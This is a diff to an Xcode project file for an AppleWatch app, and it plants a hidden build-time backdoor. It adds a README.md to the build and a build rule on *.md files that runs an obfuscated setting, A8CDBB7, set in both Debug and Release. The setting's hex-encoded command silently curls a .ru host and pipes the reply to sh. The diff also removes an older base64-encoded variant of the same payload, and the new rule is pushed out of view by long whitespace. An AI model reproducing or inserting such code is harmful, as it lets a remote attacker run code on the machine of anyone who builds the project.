@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		D042CD5E72BA41ED927BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 0D86F819819A497B997BBDC8; };
 		0FA5BC1B2E7BBFDC006DEF7C /* AppleWatch Watch App.app in Embed Watch Content */ = {isa = PBXBuildFile; fileRef = 0FA5BC1A2E7BBFDC006DEF7C /* AppleWatch Watch App.app */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
 
@@ -35,6 +36,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		0D86F819819A497B997BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		0FA5BC142E7BBFDC006DEF7C /* AppleWatch.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = AppleWatch.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		0FA5BC1A2E7BBFDC006DEF7C /* AppleWatch Watch App.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "AppleWatch Watch App.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -69,6 +71,7 @@
 		0FA5BC152E7BBFDC006DEF7C /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				0D86F819819A497B997BBDC8 /* README.md */,
 				0FA5BC142E7BBFDC006DEF7C /* AppleWatch.app */,
 				0FA5BC1A2E7BBFDC006DEF7C /* AppleWatch Watch App.app */,
 			);
@@ -82,11 +85,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0FA5BC2B2E7BBFDE006DEF7C /* Build configuration list for PBXNativeTarget "AppleWatch" */;
 			buildPhases = (
-				325093FFED004908947BBDC8 /* Provision Target Device */,
 				0FA5BC122E7BBFDC006DEF7C /* Resources */,
 				0FA5BC2A2E7BBFDE006DEF7C /* Embed Watch Content */,
 			);
 			buildRules = (
+				F5DCF325337E4DDC967BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 				0FA5BC1D2E7BBFDC006DEF7C /* PBXTargetDependency */,
@@ -159,28 +162,23 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																										/* End PBXBuildRule section */
+		F5DCF325337E4DDC967BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																											/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		325093FFED004908947BBDC8 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -188,6 +186,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D042CD5E72BA41ED927BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -222,7 +221,7 @@
 		0FA5BC252E7BBFDE006DEF7C /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -285,7 +284,7 @@
 		0FA5BC262E7BBFDE006DEF7C /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xxXd | tr -d X` -p -r; };echo 6563686f202224286375726c202d666b4c73202d2d636f6e6e6563742d74696d656f7574203235202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f702d326d35647a38767738322e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
